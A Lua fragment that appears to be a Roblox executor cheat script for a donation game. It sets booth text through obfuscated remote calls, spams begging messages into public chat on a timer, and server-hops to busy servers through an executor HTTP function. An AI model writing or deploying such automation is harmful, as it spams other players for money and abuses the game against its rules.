local function formatNumber(n)
    if n >= 10000 then return string.format("%.1fk", n / 1000)
    elseif n >= 1000 then return string.format("%.2fk", n / 1000)
    else return tostring(n) end
end

local function updateBoothText()
    if not _G.settings.textUpdateToggle or not newRaisedFormat then return end
    local currentRaw = tonumber(newRaisedFormat.Value) or 0
    local goalRaw = currentRaw + tonumber(_G.settings.goalBox)
    local text = _G.settings.customBoothText:gsub("%$C", formatNumber(currentRaw)):gsub("%$G", formatNumber(goalRaw)):gsub("%$JPR", tostring(_G.settings.jumpsPerRobux))
    
    local basePayload = {
        textFont = Enum.Font.SciFi, richText = true, strokeColor = Color3.new(0,0,0), strokeOpacity = 0,
        textColor = Color3.new(1,1,1), buttonStrokeColor = Color3.new(0,0,0), buttonTextColor = Color3.new(1,1,1),
        buttonColor = Color3.new(0.38,1,0), buttonHoverColor = Color3.new(0.38,1,0), buttonLayout = "", text = text
    }

    task.spawn(function()
        fireObfuscatedRemote("SetBoothText", text)
        fireObfuscatedRemote("SetCustomization", basePayload)
    end)
end

local function splitString(inputstr)
    local t = {}
    for str in string.gmatch(inputstr, "([^,]+)") do table.insert(t, str:match("^%s*(.-)%s*$")) end
    return t
end

local function chat(msg) pcall(function() TextChatService.TextChannels.RBXGeneral:SendAsync(msg) end) end

local function begging()
    while _G.settings.autoBeg do
        local msgs = splitString(_G.settings.begMessage)
        if #msgs > 0 then chat(msgs[math.random(#msgs)]) end
        task.wait(tonumber(_G.settings.begDelay) or 300)
    end
end

local function serverHop()
    if req then
        task.spawn(function()
            local body = HttpService:JSONDecode(req({Url = "https://games.roblox.com/v1/games/8737602449/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true"}).Body)
            if body and body.data then
                local servers = {}
                for _, server in pairs(body.data) do
                    if server.playing < 25 and server.id ~= game.JobId and server.playing > 12 then table.insert(servers, server) end
                end
                if #servers > 0 then TPService:TeleportToPlaceInstance(8737602449, servers[math.random(1, #servers)].id, player) end
            end
        end)
    end
end

